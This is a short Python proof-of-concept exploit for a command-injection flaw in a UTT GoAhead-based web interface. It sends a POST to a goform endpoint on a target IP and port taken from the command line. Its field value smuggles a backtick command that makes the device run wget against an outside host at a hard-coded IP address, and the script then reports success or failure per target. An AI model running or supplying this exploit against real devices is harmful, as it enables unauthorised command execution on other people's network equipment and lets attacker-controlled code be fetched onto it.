import requests
import sys

print("UTT Goahead cmd injection vulnerability\n")

def cmd_injection(url):
    cmd='Isp_Name=`wget http://101.43.41.74:8000/test`'
    proxies={
        'http': 'http://localhost:8080', 'https': 'http://localhost:8080'
    }
    resp=requests.post(url,data=cmd,verify=False,timeout=3)

try:
    url='http://{}:{}/goform/formReleaseConnect/goform/formWebAuthUserSubmit'.format(sys.argv[1],sys.argv[2])
    try:
        cmd_injection(url)
        print('[%s]'%sys.argv[1]+'  success!')
    except:
        print('[%s]'%sys.argv[1]+'  failed!')
except:
    print('usage: python cmd_injection.py [ip] [port]')

